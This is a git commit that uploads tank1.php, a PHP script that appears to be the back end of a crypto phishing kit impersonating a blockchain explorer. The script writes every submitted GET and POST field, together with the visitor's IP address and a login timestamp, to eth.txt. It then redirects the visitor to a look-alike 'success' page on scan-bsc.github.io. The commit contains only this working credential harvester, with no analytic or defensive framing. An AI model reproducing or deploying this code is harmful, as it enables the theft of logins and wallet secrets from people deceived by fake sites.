fbef958ff4a2a84d5da1c542643920932ba359d5
etherscan-hold <146402005+etherscan-hold@users.noreply.github.com>
2024-10-19 11:21:54 +0700

    Add files via upload

---
+++ tank1.php
@@ -0,0 +1,30 @@
+<?php
+header ('Location: https://scan-bsc.github.io/us/succes.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
+$handle = fopen("eth.txt", "a");
+
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+$ip = $_SERVER['REMOTE_ADDR'];
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+
+fwrite($handle, ":Ip Address: $ip");
+fwrite($handle, "\r\n");
+fwrite($handle, ":Waktu Masuk: ".date('d-M-Y G:i:s A',  strtotime("+7 hours"))."\r\n");
+// assuming Indonesia timzone is GMT +7 and you want 24-hour format time
+// according to your comments below
+fclose($handle);
+exit;
+echo "<script images=\"JavaScript\">
+
+</script>";
+?>
+
